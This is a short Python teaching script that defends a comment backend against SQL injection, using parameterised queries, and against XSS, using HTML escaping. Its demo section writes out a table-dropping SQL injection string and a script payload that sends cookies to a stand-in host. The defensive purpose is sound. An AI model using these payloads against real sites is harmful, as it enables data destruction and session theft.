#!/usr/bin/env python3
"""
Secure Web Backend Example
Demonstrates defense against SQL Injection (SQLi) and Cross-Site Scripting (XSS)
"""

import sqlite3
import html

def setup_database():
    """Creates a temporary in-memory database for testing."""
    conn = sqlite3.connect(":memory:") 
    cursor = conn.cursor()
    cursor.execute("CREATE TABLE comments (id INTEGER PRIMARY KEY, username TEXT, content TEXT)")
    conn.commit()
    return conn

def add_comment(conn, username, content):
    """
    DEFENSE #1: SQL INJECTION PROTECTION
    We use '?' placeholders. The sqlite3 library forces the database 
    to treat the user input purely as text strings, never as executable SQL.
    """
    query = "INSERT INTO comments (username, content) VALUES (?, ?)"
    
    cursor = conn.cursor()
    # The variables must be passed as a tuple in the second argument.
    cursor.execute(query, (username, content))
    conn.commit()
    print(f"✔ Successfully saved comment from: {username}")

def generate_safe_html(conn):
    """
    DEFENSE #2: XSS PROTECTION
    Before rendering data to a webpage, we must escape the HTML characters.
    """
    cursor = conn.cursor()
    cursor.execute("SELECT username, content FROM comments")
    comments = cursor.fetchall()
    
    html_output = ["<ul>"]
    
    for row in comments:
        raw_username = row[0]
        raw_content = row[1]
        
        # html.escape() turns characters like < and > into &lt; and &gt;
        # This stops the browser from executing hidden JavaScript tags.
        safe_username = html.escape(raw_username)
        safe_content = html.escape(raw_content)
        
        # Now it is safe to embed in HTML
        list_item = f"  <li><b>{safe_username}</b>: {safe_content}</li>"
        html_output.append(list_item)
        
    html_output.append("</ul>")
    return "\n".join(html_output)

# --- RUNNING THE SIMULATION ---

if __name__ == "__main__":
    db_connection = setup_database()
    
    print("--- Simulating Hacker Attacks ---\n")
    
    # Attack 1: Classic SQL Injection
    # The hacker tries to drop (delete) the entire comments table.
    hacker_name_1 = "EvilUser"
    sql_payload = "Nice site! 1'); DROP TABLE comments; --"
    add_comment(db_connection, hacker_name_1, sql_payload)
    
    # Attack 2: Cross-Site Scripting (XSS)
    # The hacker tries to embed a script that steals user cookies.
    hacker_name_2 = "ScriptKiddie"
    xss_payload = "<script>fetch('http://hacker.com?steal='+document.cookie)</script>"
    add_comment(db_connection, hacker_name_2, xss_payload)
    
    print("\n--- Generating Webpage Output ---\n")
    
    # Output the sanitized HTML
    safe_webpage = generate_safe_html(db_connection)
    print(safe_webpage)
    
    print("\n--- Conclusion ---")
    print("Notice how the <script> tags were converted to &lt;script&gt;.")
    print("The browser will display the hacker's code as harmless text, rather than executing it!")
